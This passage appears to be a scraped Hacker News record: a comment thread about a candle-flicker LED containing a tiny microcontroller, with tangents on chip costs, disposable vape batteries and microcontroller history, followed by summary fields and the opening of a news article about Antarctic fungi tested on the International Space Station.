this limitations. reply jacquesm 7 hours agoparentprevWe're almost at (or are already at) the stage where the packaging of the chip costs more than the computer inside it. reply ChuckMcM 6 hours agorootparentI have had Microchip FEs say as much to me. Will be interesting when chiplet technology gets to the point where multiple chips are installed in a plastic package (there are thermal expansion/contraction issues that make this a hard problem but still ...) reply jacquesm 6 hours agorootparentIf and when the cooling problem is solved and we can just stack layers at will computronium will truly have arrived. Adding another dimension will unlock hardware potential that we can only dream of today. reply kragen 3 hours agorootparentprevchiplets still lose area to scribing and dicing reply kragen 3 hours agorootparentprevwe're two orders of magnitude past that stage. a ryzen 7 is ten billion cmos transistors for a hundred dollars, ten nanodollars per transistor. so how much does a minimal computer cost at ten nanodollars per transistor? the intersil im6100 was a pdp-8 cpu in 4000 cmos transistors, and the 6502 was comparable, but that's with no memory other than the cpu registers. for a useful microcontroller you probably need about 8192 bits of instruction memory and a few bytes of ram, so let's round up to 16384 transistors for a whole computer. an 8051, with built-in instruction eprom and 128 bytes of ram, was 50k. the arm2 without ram was 27k. an avr, with built-in ram and flash, is 140k. https://en.wikipedia.org/wiki/Transistor_count at that price, counts of 16384 to 131072 transistors work out to 0.016¢ to 0.13¢. but the cheapest computer you can buy today is a padauk pms150c https://www.lcsc.com/product-detail/Microcontroller-Units-MC... which is 4.2¢ in onesies (and 2.43¢ in quantity) with 64 bytes of ram and 1024 13-bit words of one-time-programmable prom for the program https://free-pdk.github.io/chips/PMS150C. that's 150× more; in the day of moore's law doublings every two years that would have been 14 years, but now it's probably longer. (incidentally this same blog looked at them a few years ago https://cpldcpu.wordpress.com/2019/08/12/the-terrible-3-cent...) ergo we've been at the stage where the packaging of the chip costs more than the computer inside it since about 02009 (obviously the ryzen 7 cpu costs a great deal more than its packaging, though, because that's what you have to do when you're competing on computrons per dollar rather than gpios per dollar. in theory for 2.43¢ you should be able to get 2.4 million transistors, enough for about 300 kilobytes of rom or a 50 kilobytes of sram, or half that together with a 486 or a quad-core arm3. presumably padauk is not doing this because they're using long-obsolete semiconductor process nodes, which is also why their chips are so power-hungry) reply buescher 6 hours agoparentprevYou can tell the age of an embedded programmer by whether they consider sampling an input to be \"polling\" (which to me implies blocking, but that's another discussion) and then look for silver bullets for interrupt storms. reply floating-io 6 hours agorootparentPolling has never implied blocking. It’s actually a way to avoid blocking. I think you’re thinking of “busy-wait loops”. The difference between “polling” and “busy wait” is whether or not the CPU is doing other unrelated things between samples. The difference between polling and interrupts is that with interrupts the CPU can halt entirely while waiting rather than having to take those samples in the first place. reply sam_bristow 13 hours agoprevIt might be a myth, but I seem to remember the ASICs used to flicker older LED designs were often repurposed from audio greeting cards. The light was actually just Happy Birthday playing through an LED or bulb rather than a speaker. reply userbinator 13 hours agoparentNot a myth. I clearly remember watching a YouTube video where this was discovered, only a few years ago, but of course the uselessness of search engines these days has made it impossible to find now. reply mrb 11 hours agorootparentHere is a May 2011 post of someone who discovered that: https://www.halloweenforum.com/threads/interesting-fact-abou... And here is someone who recorded audio samples (no idea of the year): https://www.instructables.com/How-to-Listen-to-Light/ Edit: and here is maybe the video you were remembering: a video from June 2011 of someone hooking a speaker to listen to the flickering led: https://youtu.be/753-lkao8l0?si=-WqRRuBH644oKTXG But they don't realize this may be an audio chip as the tune isn't really nice or recognizable. reply userbinator 10 hours agorootparentThanks! From your second link, there is this text that dates it to mid-2008: Update 20 Nov, 2009: This additional step was added on 20 Nov, 2009, about a 1+1/2 years after the bulk of this instructable was published. reply marginalia_nu 11 hours agorootparentprevYeah I think I saw that too, bigclive maybe? reply userbinator 10 hours agorootparentLikely to have been him, but you have a sibling comment that shows others also discovered this fact, before him. reply boznz 9 hours agoparentprevAnother common and low code method of getting random lights from your overused and under-resourced micro was to simply output a segment of ROM code to the IO ports the LEDs were on, often used this trick for twinkling XMAS lights or front panel lights for the custom controllers we made in the 1080's reply 082349872349872 13 hours agoprevOnce upon a time, on USENET, someone had a .sig that predicted one day computers would be cheap enough they'd come in cereal boxes and we'd throw them away. That day appears to have arrived. reply yau8edq12i 13 hours agoparentThe worst offenders right now might be disposable vapes. I saw some sold with effing lcd screens built-in. For a disposable piece of crap. reply FirmwareBurner 11 hours agorootparentI'm waiting for the EU to ban these fucking things already. That and disposable power banks. Yes, you read that right. Selling consumer devices with Li-Ion batteries that are designed to not be rechargeable, should be banned altogether. reply rcxdude 11 hours agorootparentInteresting thing about li-ion batteries, is they have much less lithium in them than disposable lithium coin cell batteries, and hold much more charge. If we're outlawing disposable li-ions we should outlaw those as well. reply FirmwareBurner 11 hours agorootparent>If we're outlawing disposable li-ions we should outlaw those as well. Except when your watch battery dies, you only dispose of the battery, not together with the watch, as is the case with those single-use vapes. reply thanatos519 9 hours agorootparentprevIndeed these things are an abomination. I regularly find half consumed vapes at intersections where they have clearly been accidentally dropped and abandoned by cyclists. I have a nice collection of perfectly good lithium batteries. reply tasty_freeze 4 hours agorootparentCyclists in your area are vaping while they ride? Just spitballing here, but considering that at typical intersections, automobile traffic outnumbers cyclist traffic by at least 100:1, isn't it more likely that those vapes were throw out the window of a car when someone got frustrated they clogged or something? (I'm not a vaper, but I've heard of clogged vapes being a common occurrence). reply makerdiety 8 hours agorootparentprev> I regularly find half consumed vapes at intersections where they have clearly been accidentally dropped and abandoned by cyclists. I have a nice collection of perfectly good lithium batteries. If true, then the hedonism and pleasure seeking (the homeostatic pleasure trap is a monkey trap) found within the big, global industrial complex is meant for a small set of secret hackers to take advantage of by collecting disposed \"vape\" or smoking pleasure devices for powering some cool nerd contraptions. Don't be afraid to get your hands dirty when you pick up trash. Because capitalism produces treasure when it excretes its waste products. You just have to be outside the capitalist world-system to do this cool trick. reply quatrefoil 11 hours agorootparentprevWe're OK with disposable alkaline batteries, so what makes lithium worse? If anything, alkaline batteries might have a slightly worse environmental footprint due to the use of manganese. The problem with lithium batteries is that they can catch on fire, but that's a problem only when charged (or charging). A fully discharged battery shouldn't do much. reply mschuster91 11 hours agorootparent> We're OK with disposable alkaline batteries, so what makes lithium worse? No we're not. Disposable batteries should not be a thing anywhere, especially not in products where they cannot easily be removed by design. Alkaline batteries may not combust when damaged, but their internal juice leaking out is damn corrosive. > A fully discharged battery shouldn't do much. Even that is enough to light trash compactor trucks or the heaps on waste collection plants to fire. This shit is becoming a massive problem for the trash hauler and processing industry. One in Australia blames 35 (!) fires a day in the country... no surprise if 1.8 million of them are sold a week [1]. This is frankly insane, and the rise in trash fires directly corresponds with disposable vapes. Additionally, we need every bit of lithium we can get for electric vehicles and other stuff. Not for throwaway devices. [1] https://www.abc.net.au/news/2023-12-02/qld-lithium-ion-batte... reply doubloon 8 hours agorootparentshould Apple be forced to produce batteries for 2001 clamshell ibooks? reply mschuster91 3 hours agorootparentNo but they should be forced to open up the specs after the manufacturer support ends, so that the free market can decide for itself. reply MiguelX413 7 hours agorootparentprevProbably not, but I don't really see what that has to do with anything. reply graphe 12 hours agorootparentprevI've collected a few of them and they are robust and rechargable batteries. A common battery is IP17350 1100mAh 4.07Wh (Date of manufacture the one I see on the one I'm holding is 20210613). Anyone got any idea to use them besides small flashlights? They also have a pressure sensor on the LED and a nice metal case pretty often. reply dgacmu 8 hours agorootparentDepending on the battery there are cheap AliExpress boards - or diy - to make tiny UPSes for a raspberry pi or other usb-powered device. I don't know for that specific battery; I have some that take 18650s, though. One 18650 can get you several hours of runtime for a pi zero. The battery can cost more than the zero. The cheaper one cell UPS boards are about $2 (plus shipping). An advantage of single cell UPSes is that you don't have to worry about balancing, which is a bit of a pain with scavenged cells. reply fragmede 8 hours agorootparentprevI turn them in to my local battery recycler for further processing. reply Scoundreller 13 hours agorootparentprevThe rechargeable lithium batteries in those really doesn't fit the \"lithium shortage\" and \"we don't have enough battery capacity to build an EV for everyone\" narrative reply jdietrich 11 hours agorootparentIt takes around 850g of lithium carbonate to produce one kWh of lithium batteries. The current market price for lithium carbonate is about $14/kg. The base spec Tesla Model 3 has a 57.5kWh battery pack, so the lithium in the pack represents a cost of ~$685, or just under 2% of the list price of the vehicle. A typical disposable vape contains about five cents worth of lithium. https://www.irena.org/-/media/Files/IRENA/Agency/Technical-P... reply leipert 3 hours agorootparentAnother post in this thread mentions 1.8 million disposable vapes being sold per week in Australia. So that corresponds to 131 EV batteries per week. Or roughly 48000 EV batteries per year. 87000 EVs were registered in Australia in 2023. Make of that what you want, but disposable electronics to administer nicotine seem to be a major waste. reply conradev 12 hours agorootparentprevIt actually fits the narrative pretty well The materials for one EV battery can make ~30 e-bikes, and currently EVs are too expensive for most people. The way to fix that and the way that industry is fixing it is to make batteries more efficient (higher-density, new anodes/cathodes) in parallel with making a bunch more of them (and mining more lithium). If we succeed in making a $25k EV, the batteries used in those vapes will be _even cheaper_. I don’t think it’s desirable and I find the waste appalling, but I do think that disposable batteries can only be expected to grow without intervention. reply markstos 13 hours agorootparentprevIt does if the vape makers have an underpriced lithium source and don’t care about the pending lithium shortage. reply Scoundreller 12 hours agorootparentthey're just buying off-the-shelf cylindrical or flat-pack li-ion cells reply folmar 10 hours agorootparentA popular theory is that they use \"QC reject\" grade, as the batteries often have arount 800 mAh capacity, two times less than most basic commercial grade. reply jdsully 13 hours agorootparentprevOne car has 4,500 cells - bigger cells than most of the vapes. So it really is a matter of scale. reply exe34 12 hours agorootparentHow many cars does one smoke in a year though? reply aftbit 12 hours agorootparentHopefully zero! Still, if you replace your car (or its battery) every 10 years (pretty long IMO) and smoke one vape a day (yikes), you'll use more cells on your car than your vapes. reply wlesieutre 9 hours agorootparentI hope someone who replaces their car every 10 years isn’t just sending the old one to the compactor when they’re done with it For one, 10 years is a perfectly good used car for somebody, and for two with large EV battery packs we’d expect some lithium recycling effort Disposable vapes don’t have either of those going for them, batteries go straight in the trash after one charge cycle reply lmm 11 hours agorootparentprevThe kind of people who can afford to buy EVs buy a new car what, every 3 years? So I guess about 1/3 of a car (or, using the numbers from another comment, about 4000 vapes' worth). reply exe34 2 hours agorootparentThe car is recycled, while the vapes are sent to the landfill. reply _puk 10 hours agorootparentprevI thought a Tesla smoked them all.. I'll show myself out! reply worewood 11 hours agorootparentprevDo not give those guys ideas reply tomatotomato37 12 hours agorootparentprevThe lithium in those cheap disposable things are less \"lithium\" and more \"metallic powder/paste that theoretically contains elements of lithium.\" It's not something you'd want to actually use in anything important like a car battery reply jdietrich 11 hours agorootparentNot true. \"Disposable\" vapes use commodity li-ion cells, of the same basic type that you'd find in a cellphone, a laptop or an EV. They probably aren't the best quality, but there's nothing unusual about the chemistry or packaging. Li-ion cells are the preferred chemistry because of the very high discharge rate - alkaline or primary lithium cells just can't deliver enough current. The cell is perfectly capable of being recharged, but some people prefer the convenience of a disposable device and manufacturers are quite happy to respond to that demand. It's wasteful, I don't particularly approve of it, I expect to see a lot of jurisdiction ban disposable vapes, but nor do I think it's particularly egregious or meaningfully impacting on the commodity price of lithium carbonate. https://hackaday.com/2022/05/05/2022-hackaday-prize-disposab... reply userbinator 9 hours agorootparentsome people prefer the convenience of a disposable device I don't understand this. Instead of plugging it into a charger, they'd rather go to the store to buy another, or more likely order online and wait for it to be delivered? reply kragen 3 hours agorootparenti don't have personal experience with this, but i imagine so, because if you plug your vape into a charger, you can smoke it in an hour or two, and if you buy a cigarette at the convenience store that's a block away, you can smoke it in two minutes maybe you live somewhere without convenience stores reply fragmede 8 hours agorootparentprevit's the convenience. If they had the executive function to get them online, they would save money and get a reusable device instead. reply graphe 6 hours agorootparentI introduced a battery charger to a group of people that used disposable vapes and the knowhow to charge them. It changed the way they interacted with the vapes completely even saying funny high ideas like \"we should patent this\". reply self 11 hours agoparentprevI searched Google for this recently and could not find it. I tried it again on Google Groups just now and found one reference to it: https://groups.google.com/g/comp.arch/c/Y4C_Zjkb9VM/m/scDk_0... > Killer micros of today are a lot like flourescent lights -- cheap to operate, prevalent, and expensive to turn off. To see a machine standing idle, when you were raised as a child to \"use cycles efficiently\" is a gut-wrenching experience. Just remember Alan Kay's prediction: In the future, computers will come in cereal boxes and we will throw them away. March 20, 1990. I haven't found a source for Alan Kay's prediction. reply kens 9 hours agorootparentVarious fortune files attribute the quote to Robert Lucky. I would guess that it was misattributed to Alan Kay since quotes often get attached to famous people. \"In the future, you're going to get computers as prizes in breakfast cereals. You'll throw them out because your house will be littered with them. -- Robert Lucky\" https://web.mit.edu/~mkgray/jik/sipbsrc/src/fortune/scene reply FirmwareBurner 13 hours agoparentprevThat happened way before. RFID cards for disposable public transportation tickets or those music greeting cards. reply mikepurvis 13 hours agorootparentAt a certain point it's more about the semantics of what a \"computer\" is. I don't know if I'd count an ASIC from a musical greeting card, though; and even within general purpose devices, microcontrollers vs microprocessors are typically delineated by the presence of an MMU. reply wongarsu 12 hours agorootparentIf I can program it to execute a sequence of arithmetic and logical operations that approximate a Turing machine (with a finite band), and reprogram it at a later date to execute a different sequence of such operations, that's a computer to me. I wouldn't count ASICs, but the PIC12F508 or the 3-cent microcontroller referenced in the post definitely count. Though by my definition of requiring reprogrammability and Turing completeness I am purposefully excluding many things that have historically been considered computers, like the many mechanical computers of the 19th and 20th century. From that standpoint I can see how some people might count ASICs as computers, even if I don't think that fits modern usage. reply sitkack 10 hours agorootparentThese RISC-V chips are on the order of .02 to .10 (qty 1) https://www.wch-ic.com/products/CH32V003.html The PIC12 has 25 bytes! of sram. The CH32V003 has 2k. https://www.aliexpress.us/w/wholesale-CH32V003.html?spm=a2g0... reply kragen 13 hours agorootparentprevthe 6502, 8080, z80, 8085, 8086, 65816, 68000, and 68010 were universally described as microprocessors, not microcontrollers, but did not have mmus built in (and of these only the 68010 could easily have one bolted on, as i understand it) i think typically the thing that distinguished these from microcontrollers like the 8031, 8051, 8748, 8751, pic1650, etc., is that the microcontrollers had program memory built into them, either rom, eprom, or, starting in the 90s, flash. so they didn't need to be booted, they didn't need program ram, and in fact for a lot of applications they didn't need any external ram at all reply Karliss 1 hour agorootparentArguing about hard definitions differentiating microprocessor from microcontrollers based on single feature is pointless. It's a vague product/marketing category for certain usecases. There will be group of features that are more likely included or not included, but for most of them there will likely be exceptions. And the set of available features available MCUs and microprocessors change over the time. As technology improves both microcontrolers and processors are gaining new capabilities. * MCUs usually have program memory builtin. But then there chips like RP2040 or ESP32 which while considered MCUs are used with external Flash memory chips for storing the firmware. * MCUs usually have builtin RAM. But there are also some capable of directly using external RAM. * Then there are things like apple M1 chips, with a lot of stuff builtin you still don't call them MCU. * A bunch of ARM application processors/SOCs/Microprocessors might have enough resources builtin that they could be used as more or less standalone microcontrollers, without external RAM or flash memory. * some early microprocessors used external MMUs and it took some time until the processors settled on architecture that's closer to how we have things now * early personal computer processors were in a weird category in terms of price and processing power, in certain time period it wasn't impossible that similar microprocessor chip was used both for as main computer CPU and also for peripheral devices. The microprocessor name in my opinion at this point is slightly outdated. It's not like anyone beside hobbyists is making non micro processors out individual relays, transistors or logic chips. reply 0xcde4c3db 10 hours agorootparentprevI believe 68000 could use an MMU, but the catch was that it couldn't do demand paging, just memory protection and virtual/physical translation. I can't find the specific explanation right now, but it's something along the lines of the bus error exception (needed to actually stop the memory cycle) being special in a way that sometimes causes an incorrect PC value to be pushed to the stack. So you could terminate a process on an MMU exception, but resuming it was not reliable. reply tzs 7 hours agorootparentThere was at least one company (Apollo, I think) that implemented demand paging on 68000 by using two 68000s. You had one, the leader, running as the \"real\" CPU, with the other, the follower, executing the same code on the same data but delayed by one instruction. If the leader got a bus error they would generate an interrupt on the follower to stop it before it executed the bus erroring instruction. The leader and follower would then switch roles, and the new leader could deal with the situation that had caused the bus error on the former leader. reply jacquesm 7 hours agorootparentThat's so clever. What a hack. I'm imagining the slow smile on the face of the person that came up with it. \"What if...\". reply mopsi 10 hours agorootparentprevI feel that the semantics are quickly becoming irrelevant. Many everyday items like sports watches, toys, kitchen appliances, alarm clocks or table radios already have more processing power, more memory and storage, higher resolution screen and better network connectivity than my first desktop. Running Doom on mundane items like key fobs and light bulbs isn't too far away from where we are in 2024. reply throwup238 9 hours agorootparent> Running Doom on mundane items like key fobs and light bulbs isn't too far away from where we are in 2024. About that... https://www.pcmag.com/news/you-can-run-doom-on-a-chip-from-a... reply Sharlin 8 hours agorootparentprevDoom on a light bulb is already done: https://hackaday.com/2021/06/15/a-smart-light-bulb-running-d... reply Modified3019 8 hours agorootparentprevI'm pretty sure musical greeting cards are also a thing. reply pietervdvn 10 hours agoparentprevI got a server blade with a Xeon processor and 96 gigabytes of RAM for free last week... Granted, it is a ten year old device, but still. Another friend will give me a 180 gigabyte RAM device next week, cause it would go to the container otherwise... reply crote 9 hours agorootparentYeah, I remember looking into getting a refurbished cloud server instead of a brand new desktop a decade ago or so. They weren't free, but you'd still get a machine with 40 cores and 120gb of RAM for only $400. Pre-Ryzen, it was a very attractive offer. I never ended up buying one, because it'd consume way more power than made sense, and they're kinda shitty for gaming/workstation use due to low single-core performance and NUMA issues. reply jacquesm 7 hours agorootparentprevIt's the power consumption and the noise that gets you with those. reply pi-rat 13 hours agoparentprevThere’s been generic microcontrollers (usually single shot programmable) available for less than 3 cent per mcu for half a decade already. Check out Padauk and similar MCUs. reply dragontamer 11 hours agoparentprevAt least a decade ago, a major magazine had a disposable chip inside for... I don't remember why. Does anyone remember this? reply HenryMulligan 4 hours agorootparentI remember receiving this video ad for a Chevy pickup truck in a print issue of Popular Mechanics circa 2015 [0]. When disassembled, it consisted of a screen, battery, speaker, and circuit board. What the article doesn't say is that the circuit board had a micro-USB port which when connected to a computer mounted the internal storage as a drive, with the four-or-so videos it played accessible. I actually managed to find an existing home video video with the correct format (I wasn't familiar with FFmpeg at the time) and when one of the internal videos was replaced with mine (with the same filename), it would play instead. I believe the micro-USB also charged the internal LiPo battery as well, as I don't recall being worried too much about battery life. I probably still have the thing somewhere! [0] https://www.tubefilter.com/2015/04/16/chevrolet-video-ads-in... reply justsomehnguy 10 hours agorootparentprevEsquire October 2008 e-ink cover? reply throwaway2037 4 hours agorootparentSomeone hacked that too! Hacking the Esquire e-ink cover https://www.popsci.com/diy/article/2008-09/hacking-esquire-e... reply dragontamer 9 hours agorootparentprevA good guess but that's not what I was thinking of... My example was all the above except the chip was centerfold in the middle of the magazine. Not on the cover... I'm surprised this happened more than once however. reply crote 9 hours agoparentprevWe've been there for about a decade now. Single-use paper transit tickets equipped with an RFID-capable microcontroller are quite common now. reply ezconnect 9 hours agorootparentI used to keep those disposable bus ticket back in 2007 hoping to find a used for it. After a year I didn't find a use for it. reply shagie 7 hours agoprevOne of the things that I've thought about back in the days of poorly looped animated gifs and Java applets was those annoying flame gifs that didn't loop right. A project that I tinkered with (never finished) was creating a cellular automata that creates a flame like structure. For a Java applet, it would have just continued on forever with random fuel being added. However, a different application of the 'fuel' for the flame would have had it loop over some period. The other part is that with animated gifs and a 256 color pallet, one could index the flame color. Roughly for RGB this is step 3 through 0,0,0 -> 255,0,0 -> 255,255,0 -> 255,255,255 (not perfect, but it kind of works for a proof of concept). And then, the value of a cell is a function of the cells below it in the previous time iteration. With the fuel rows at some point looping (if written that way), so too would the overall frame loop at some point... and you could have a perfectly looping flame gif. While that's all well and good, flame gifs are kind of a 90s thing... but my interest in reviving that old code coincides with me occasionally wondering \"what could I do if I made a volumetric display?\" reply marssaxman 13 hours agoprevSeems like a small step up from the ubiquitous WS2812, an LED with an onboard controller handling PWM and one-wire communication. Years ago, before animated LED christmas lights were readily available, I hand-made such a string out of ATtiny85 controllers, soldered onto bicolor red/green LEDs, one controller per light. A little bit of C and an evolving animation algorithm recycled from a previous project yielded a pleasing quasi-rhythmic effect. It was absurdly non-economical, but felt like a glimpse of the future. reply jacquesm 7 hours agoparent$.032 in quantity... reply graphe 12 hours agoprevIf you'd like to see this and more in software for flashlights please visit toykeeper's projects! https://github.com/ToyKeeper/anduril https://toykeeper.net/ I loved this feature on my flashlight and used it exclusively on candle mode. There's a lot of thought that goes into it like PWM speed or direct drive for LEDs that may or may not cause flickering and a tradeoff between battery life and the electronics available. reply NikkiA 11 hours agoparentI'd rather they didn't, I recently upgraded our household flashlights and was pleased to be able to get 3-mode rather than the ridiculous 5 and 7 mode that they were replacing, no more having to loop through 'SOS' and several ridiculous flash patterns, a half-dozen brightness settings and so on to get to the 'full brightness, no flashing' setting that was needed 100% of the time. reply rjmorris 8 hours agorootparentMaybe I misunderstood you, but Anduril doesn't include strobe modes on the main cycle, and it lets you configure how many brightness steps you want (or hold for continuous ramping). So it sounds to me like you should want people to check out Anduril, since it addresses the two issues you mentioned with your old flashlights. reply graphe 10 hours agorootparentprevThose are the bad ones. If you get this one the only mode you'd get is a ramping effect by holding the button to make it go brighter or lower. reply ThisIsMyAltAcct 12 hours agoprevSome people say software is eating the world but I prefer to say its infesting it. reply dist-epoch 11 hours agoparentDNA is software. The world is already full of software. We're just catching up. reply jacquesm 7 hours agorootparentTechnically speaking it is a very large configuration file. The config reader runs Ribosome 0.8, which escaped from the lab a couple of billion years ago and infested a whole planet to the point that it became inhospitable to life. reply queuebert 11 hours agoprevI would have assumed that nowadays using a small neural net to approximate a CFD model of a flame would be the easiest. reply throwaway4good 1 hour agoprevWho produces these? And at what cost? reply linker3000 13 hours agoprevIf you want to see some candle flicker code based on a PIC12F508 or 9 see below. The flicker effect is based on a linear feedback shift register function to provide a pseudo random effect. https://github.com/linker3000/CandleFlameSim reply huppeldepup 13 hours agoparentGoing to drop this here: “Reverse engineering” a real candle https://cpldcpu.wordpress.com/2016/01/05/reverse-engineering... reply cmiller1 12 hours agorootparentThis is great, I wish I could find off the shelf LED candles that more closely approximate the real thing. I'd also like them to be taper candles on a little holder with a loop finger hole so I can grab it to investigate noises in the night. reply rapjr9 3 hours agorootparentThe best LED candle/flame simulations are the ones that use many LED's such as: https://www.amazon.com/gp/product/B08789LJPS https://www.amazon.com/gp/product/B07RBPLRPV There used to be a company that made 192 LED rechargeable candles which looked like real flames (when behind frosted glass). They have apparently stopped selling them because of all the cheaper ripoffs with fewer LED's and worse algorithms. The many LED flames look more realistic because the light source actually moves, rather than just varying in intensity. They had a bulb similar to the first link above. It's odd that the cheap LED lights don't use a better algorithm, a brownian motion or fractal algorithm with pseudorandom number generator designed for a long sequence before it repeats wouldn't raise the price, it just takes a little more time to implement. reply rgovostes 12 hours agoprevSemi-relatedly, the best \"digital candle\" app I ever found was one that just drew an orange rectangle in the center of an otherwise black screen, and animated its scale randomly. This convincingly modulates the brightness of the display. reply cperciva 12 hours agoprevNext up: \"Porting Doom to run on an LED candle\". reply semi-extrinsic 11 hours agoparentFWIW Doom was ported to the Ikea GU10 lightbulb a couple of years ago. Unfortunately the original post and code all got taken down due to copyright claims, but archive has a copy: https://web.archive.org/web/20210615035229/https://next-hack... reply cmpxchg8b 9 hours agorootparentObviously porting Doom to run on smaller and smaller devices is impressive, but I wonder if anyone has completed Doom on one of these ports? That I’d love to see! reply userbinator 13 hours agoprevthat probably cost around a cent per die I believe it's more like a tenth or hundredth of that, if you're talking about USD. reply joezydeco 10 hours agoparentCutting, wire bonding, and mounting probably cost the rest of the penny. reply dmitrygr 13 hours agoprevI hope there is a follow up where the LED is ground down and a PICKIT2 is used to read out the code :) reply farkanoid 9 hours agoparentPicKit2 and MPLAB8 made MCU programming a pleasure. Everything was so damn snappy and responsive. Feels as though everything went downhill with the advent of PicKit3 and MPLABX. Edit: The site only exists on the wayback machine now, but there was a hate page [1] for the PicKit3 posted on Dave Jones' twitter some time ago [1] https://web.archive.org/web/20180423225612/http://www.fuckit... reply joezydeco 10 hours agoparentprevI don't buy the PIC chip theory since that means it's either programmed in-situ which seems imposible, or they're ordered with premasked or preprogrammed ROM which is hellishly expensive. reply crote 9 hours agorootparentIt could also be programmed during production. Clearly the LED manufacturer has the equipment to do wire bonding, so why not use the occasion to program it too? It'd be a bit comparable to the test and assembly process of the WS2812B, see [0] @ 2:30 or 6:10. [0]: https://www.youtube.com/watch?v=pMjhJ9kcaU4 reply apapapa 8 hours agoprevOK ... As if there a wasn't things a thousand time worst reply cushychicken 12 hours agoprevIs the actual make and model of the MCU just a guess? Doesn’t seem to be anything to corroborate the PIC12 besides a pinout the author has seen before. Just mention because there are likely a zillion eight pin MCUs with this pinout/ballout pattern. reply crote 9 hours agoparentThe post makes no mention of the actual MCU being used, they just note that it's interesting that the pinout matches the often-cloned PIC12. It's one additional piece of evidence hinting that it's probably an MCU die in there, rather than some kind of ASIC. reply Havoc 8 hours agoprevNow it just needs wifi and firmware updates. reply kebman 12 hours agoprevI really hate these fake LED candles with a passion. Either put an actual candle on the table, or just put a small cosy light that doesn't flicker. reply bxparks 12 hours agoparentI like quite them. With LED candles, there's no danger of fires if you forget about the candle, or if you accidentally knocking them over, or if something accidentally goes over the candle. There is no mess to clean up as the candle melts down the wax. There is no worry about wind blowing out the candle. I don't like those small LED candles using disposable watch/button batteries. I use ones using standard AA batteries, which means I can use NiMH rechargeables. reply whartung 8 hours agoparentprevTo each their own. I rate the “run for 6 hours each day” technology as a wonder of the modern age along with sliced bread and the Apollo program. We have about a dozen of these things throughout the house, running everyday. Some on tables, some on counters, some on the wall in sconces. They turn on and off on their own. Don’t have to worry about a cat knocking one over. We replace the batteries I think every 3 months or so. (Pair of AAAs.) Yea, easy, safe way to add atmosphere and ad hoc nightlights throughout the house. Modern marvel. reply rapjr9 3 hours agorootparentMost of the LED candles on eBay just have a one shot timer. If you're looking for the \"6 hours every day\" candles, here's an example: https://www.ebay.com/itm/254879583371 reply graphe 12 hours agoparentprevWhy? Ive known several people that died from candles including the actions of other people's usage of candles. reply Hnrobert42 11 hours agorootparentNot to mention that whenever I light a candle, my air filter spins up and my air quality monitor says pm2.5 peaks. reply gambiting 10 hours agorootparentprev>> Ive known several people that died from candles That can't possibly be true - unless of them all died in the same accident? reply graphe 10 hours agorootparentTwo incidents, two families. Happens a lot with Mexican candles. reply fulladder 5 hours agorootparentI still don't believe it. Mexican candles? This is a technology from ancient times; why would a candle made in Mexico in 2024 be any different from an American or Chinese or wherever candle? reply drjasonharrison 5 hours agorootparentMexican candles probably aren't any different except they were involved in two fires the previous commenter was familiar with. Some cultures/religions use candles as part of their holiday observances. https://www.nfpa.org/education-and-research/home-fire-safety... reply graphe 5 hours agorootparentprevMexican kids knock over the religious candles all the time. One tragic event happened when a friend's house was engulfed in flames after a candle was knocked into the curtains and she suffocated protecting her children from the smoke, I think one child had really bad breathing problems too. reply danbruc 11 hours agoprevWait till you have to wait for your candle to boot an off the shelf Linux and download security updates before it starts flickering. reply bitwize 5 hours agoprevCompute is so God-damn cheap these days that it often makes sense not to fabricate a custom ASIC, just emulate what the ASIC would do with a microcontroller. For example, in the case of people who build new, retro style computers, often a microcontroller or two are handling I/O to and from the peripherals like the screen and keyboard. Like there might be an Arduino or Pi Pico generating a VGA signal instead of a dedicated CRTC (because no one makes old-school CRTCs anymore). I just think that's wild, especially when the I/O controllers are more powerful than the main CPU itself (as might happen with a Z80-based system). reply perryizgr8 7 hours agoprevAmazing that the tip of a led electrode can now casually accommodate a \"proper\" 1 MHz microcontroller. And most of the hardware is unused! reply msla 8 hours agoprev [–] So is the program of that chip burned into mask ROM (do people still do that?) or could that thing be taken out and repurposed? The datasheet mentions handy-dandy device programmers that plug into your PC and probably mandate the use of a horrible proprietary development environment, but maybe that's only for special evaluation parts? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The author explores a candle-flicker LED with an integrated timer, finding a microcontroller inside that resembles a PIC derivative.",
      "The LED operates in PWM mode at a frequency of 125Hz, driven by the microcontroller at 1MHz.",
      "The author suggests that using a microcontroller with sleep mode could reduce the LED's current consumption and increase battery life, highlighting the growing use of inexpensive microcontrollers in low-cost electronics like candle-flame LEDs."
    ],
    "commentSummary": [
      "The discussion covers a wide range of topics including creating realistic candle flickering effects with LEDs, the development and limitations of microcomputers, and the tools and equipment necessary for working with microcontrollers.",
      "Other topics include the need for standardized modular gadgets, the environmental impact of lithium batteries, and the use and disposal of vapes and EV batteries.",
      "Software and programming topics, such as the difference between microprocessors and microcontrollers, are also discussed."
    ],
    "points": 211,
    "commentCount": 139,
    "retryCount": 0,
    "time": 1706470694
  },
  {
    "id": 39168900,
    "title": "Antarctic fungi thrive in Martian conditions, promising for future missions.",
    "originLink": "https://www.agenciasinc.es/en/News/Antarctic-fungi-survive-Martian-conditions-on-the-International-Space-Station",
    "originBody": "Close alert Suscríbete al boletín semanal Recibe cada semana los contenidos más relevantes de la actualidad científica. He leído y acepto el aviso legal y la política de privacidad, así como la información de protección de datos DINOSAURIOS ONDAS GRAVITACIONALES RINOCERONTES BACTERIAS SÍFILIS Iberoamérica Opinion Science Health Innovation Earth Technology Society Iberoamérica Opinion ENGCiencias Health Innovation Earth Technology Society Visual Specials MagaSINC Keywords Suscripción boletín Sobre sinc El equipo Reconocimientos FAQ Contact If you are registered You will not be able to connect if you exceed ten failed attempts. Email Password Remember me Forgot your password? Login If you are not yet registered The SINC Agency offers different services depending on your profile. Select yours: Journalists Institutions Queremos saber tu opinión Por favor, ten en cuenta qu SINC no es consultorio de salud. Para este tipo de consejos, acude a un servicio médico. Nombre* Email* Comentar* Quiero recibir una notificación por email cuando alguien responda a mi comentario Acepto las normas de uso No soy un robot Enviar Astronomy and astrophysics Antarctic fungi survive Martian conditions on the International Space Station European scientists have gathered tiny fungi that take shelter in Antarctic rocks and sent them to the International Space Station. After 18 months on board in conditions similar to those on Mars, more than 60% of their cells remained intact, with stable DNA. The results provide new information for the search for life on the red planet. Lichens from the Sierra de Gredos (Spain) and the Alps (Austria) also travelled into space for the same experiment. Creative Commons 4.0 license SINC/Enrique Sacristán 26/1/2016 10:37 CEST Un astronauta coloca la plataforma EXPOSE-E en la Estación Espacial Internacional. / ESA The McMurdo Dry Valleys, located in the Antarctic Victoria Land, are considered to be the most similar earthly equivalent to Mars. They make up one of the driest and most hostile environments on our 